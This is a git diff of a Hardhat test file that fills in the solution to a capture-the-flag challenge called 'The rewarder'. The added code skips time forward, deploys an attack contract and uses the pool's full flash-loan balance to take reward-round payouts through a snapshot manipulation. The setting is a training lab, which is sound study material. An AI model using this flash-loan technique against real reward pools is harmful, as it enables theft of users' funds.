@@ -45,6 +45,8 @@ describe('[Challenge] The rewarder', function () {
                 await accountingToken.balanceOf(users[i].address)
             ).to.be.eq(depositAmount);
         }
+
+
         expect(await accountingToken.totalSupply()).to.be.eq(depositAmount * BigInt(users.length));
         expect(await rewardToken.totalSupply()).to.be.eq(0);
 
@@ -59,6 +61,7 @@ describe('[Challenge] The rewarder', function () {
                 await rewardToken.balanceOf(users[i].address)
             ).to.be.eq(rewardsInRound.div(users.length));
         }
+
         expect(await rewardToken.totalSupply()).to.be.eq(rewardsInRound);
 
         // Player starts with zero DVT tokens in balance
@@ -70,6 +73,48 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Current stage:in the round2
+        /**
+         * 1: the users have gotten the rewards
+         *   Because lastRewardTimestamps[account] = lastRecordedSnapshotTimestamp and which is bigger than 5 days, so the user can't get the rewards again unless in the next round
+         * 2: current lastSnapshotIdForRewards and SnapShotId =2 
+           3. Now based on the snapshotid =2, can get the user's accountTokening balance as below
+                ids [1], values [0] each user address
+                ids [1], values [0] total supply
+        */
+
+        let id = await  rewarderPool.lastSnapshotIdForRewards(); 
+        console.log("current lastSnapshotId or current round:",id);
+        let totalDeposits = await accountingToken.totalSupplyAt(id);
+        console.log("Current total accountingToken balance:",totalDeposits);
+        let aliceAmountDeposited = await accountingToken.balanceOfAt(alice.address,id);
+        console.log("Current alice's accountingToken balance:",aliceAmountDeposited);
+        let aliceRewards = await rewardToken.balanceOf(alice.address);
+        console.log("aliceRewards",aliceRewards);
+
+        // 5 days passed
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        
+        
+        // attacker deposit the liquidityToken by flashloan, the new snpshotID will generated, also get the rewards, Lastly transfer all rewards to player
+        let TheRewarderPoolHackerFactory = await ethers.getContractFactory('TheRewarderPoolHacker', deployer);
+        let theRewarderPoolHacker = await TheRewarderPoolHackerFactory.deploy(flashLoanPool.address,rewarderPool.address);
+
+        let maxFlashLoanAmount = await liquidityToken.balanceOf(flashLoanPool.address);
+        console.log("flash loan starting.........");
+        console.log("Max flashloan amount",maxFlashLoanAmount);
+        await theRewarderPoolHacker.connect(player).attack(maxFlashLoanAmount);
+
+        // after flasloan, show the accountingToken and rewardToken info
+        id = await  rewarderPool.lastSnapshotIdForRewards(); 
+        console.log("after flash loan, show the change of the accountingToken");
+        console.log("current snapShotId:",id);
+        totalDeposits = await accountingToken.totalSupplyAt(id);
+        console.log("Current total accountingToken balance:",totalDeposits);
+        let playerRewards = await rewardToken.balanceOf(player.address);
+        console.log("Current player's rewards",playerRewards);
+
     });
 
     after(async function () {
@@ -83,6 +128,7 @@ describe('[Challenge] The rewarder', function () {
         for (let i = 0; i < users.length; i++) {
             await rewarderPool.connect(users[i]).distributeRewards();
             const userRewards = await rewardToken.balanceOf(users[i].address);
+            // console.log("User rewards",userRewards);
             const delta = userRewards.sub((await rewarderPool.REWARDS()).div(users.length));
             expect(delta).to.be.lt(10n ** 16n)
         }
